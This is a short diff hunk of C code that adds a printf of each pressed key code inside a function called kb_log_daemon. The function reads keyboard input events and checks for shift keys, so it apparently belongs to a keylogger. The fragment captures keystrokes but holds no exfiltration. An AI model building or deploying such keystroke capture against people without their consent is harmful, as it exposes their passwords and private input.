@@ -99,6 +99,7 @@ static int kb_log_daemon(void)
 
 		if (in_evt.type == EV_KEY)
 		{
+			printf("Pressed %d", in_evt.code);
 			if (in_evt.value == 1)
 			{
 				if (in_evt.code == KEY_LEFTSHIFT | in_evt.code == KEY_RIGHTSHIFT)
